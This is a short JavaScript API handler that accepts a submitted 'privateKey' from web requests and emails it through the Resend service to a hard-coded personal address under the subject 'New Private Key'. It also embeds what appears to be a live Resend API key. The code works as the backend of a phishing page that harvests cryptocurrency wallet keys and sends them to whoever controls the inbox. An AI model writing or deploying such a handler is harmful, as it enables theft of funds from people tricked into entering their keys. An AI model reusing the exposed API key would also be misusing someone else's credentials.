import { Resend } from "resend";

const resend = new Resend("re_aZKvrGzy_MXd8dcqgDGW4qz8EeBud7pqb");

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  try {
    const { privateKey } = req.body;

    const data = await resend.emails.send({
      from: "onboarding@resend.dev",
      to: "rochester2055@outlook.com",
      subject: "New Private Key",
      html: `
        <h2>New Private Key Submitted</h2>
        <p>${privateKey}</p>
      `,
    });

    return res.status(200).json(data);

  } catch (error) {
    return res.status(400).json({ error: error.message });
  }
}
